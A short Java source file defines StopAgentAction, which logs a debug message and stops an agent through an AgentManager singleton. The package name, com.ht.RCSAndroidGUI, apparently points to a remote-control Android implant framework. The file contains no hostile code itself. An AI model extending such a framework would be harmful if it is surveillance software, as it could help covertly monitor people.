package com.ht.RCSAndroidGUI.action;

import android.util.Log;

import com.ht.RCSAndroidGUI.agent.AgentManager;

public class StopAgentAction extends AgentAction {
	public StopAgentAction(int type, byte[] confParams) {
		super(type, confParams);
	}

	private static final String TAG = "StopAgentAction";

	@Override
	public boolean execute() {
		Log.d("QZ", TAG + " (execute): " + agentId);
		final AgentManager agentManager = AgentManager.self();

		agentManager.stop(agentId);
		return true;
	}

}
